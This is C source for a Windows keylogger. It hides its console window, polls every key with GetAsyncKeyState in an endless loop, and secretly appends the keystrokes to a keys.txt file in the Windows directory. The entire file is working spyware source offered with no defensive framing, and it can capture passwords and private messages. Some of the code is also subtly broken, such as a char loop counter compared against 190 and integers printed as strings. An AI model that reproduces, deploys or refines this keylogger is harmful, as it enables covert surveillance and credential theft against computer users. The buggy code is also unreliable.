#include <stdio.h>
#include <windows.h>
#include <Winuser.h>


void keys(int key,char *file)
{

FILE *key_file;

key_file = fopen(file,"a+");



if (key==8)

fprintf(key_file,"%s","[del]");

if (key==13)

fprintf(key_file,"%s","\n");

if (key==32)

fprintf(key_file,"%s"," ");

if (key==VK_CAPITAL)

fprintf(key_file,"%s","[Caps]");

if (key==VK_TAB)

fprintf(key_file,"%s","[TAB]");

if (key ==VK_SHIFT)

fprintf(key_file,"%s","[SHIFT]");

if (key ==VK_CONTROL)

fprintf(key_file,"%s","[CTRL]");

if (key ==VK_PAUSE)

fprintf(key_file,"%s","[PAUSE]");

if (key ==VK_KANA)

fprintf(key_file,"%s","[Kana]");

if (key ==VK_ESCAPE)

fprintf(key_file,"%s","[ESC]");

if (key ==VK_END)

fprintf(key_file,"%s","[END]");

if (key==VK_HOME)

fprintf(key_file,"%s","[HOME]");

if (key ==VK_LEFT)

fprintf(key_file,"%s","[LEFT]");

if (key ==VK_UP)

fprintf(key_file,"%s","[UP]");

if (key ==VK_RIGHT)

fprintf(key_file,"%s","[RIGHT]");

if (key ==VK_DOWN)

fprintf(key_file,"%s","[DOWN]");

if (key ==VK_SNAPSHOT)

fprintf(key_file,"%s","[PRINT]");

if (key ==VK_NUMLOCK)

fprintf(key_file,"%s","[NUM LOCK]");

if (key ==190 || key==110)

fprintf(key_file,"%s",".");

if (key >=96 && key <= 105){

	key = key - 48;
 
	fprintf(key_file,"%s",&key);

}

if (key >=48 && key <= 59)

fprintf(key_file,"%s",&key);



if (key !=VK_LBUTTON || key !=VK_RBUTTON){

	if (key >=65 && key <=90){ 
 
		if (GetKeyState(VK_CAPITAL))
      
			fprintf(key_file,"%s",&key);
 else

 {

	 key = key +32;

	 fprintf(key_file,"%s",&key);

 }
}

}

fclose(key_file);





}

void main()
{

char i;
HWND Wind;

  Wind = GetForegroundWindow();
  ShowWindow(Wind, false);




char test[MAX_PATH];
GetWindowsDirectory(test,sizeof(test));
strcat(test,"//keys.txt");


while(1){
	
	for(i=8;i<=190;i++){
   
	if (GetAsyncKeyState(i) == -32767)
	
	{
   
      
      keys (i,test);
	  
      

	}
}

}

}
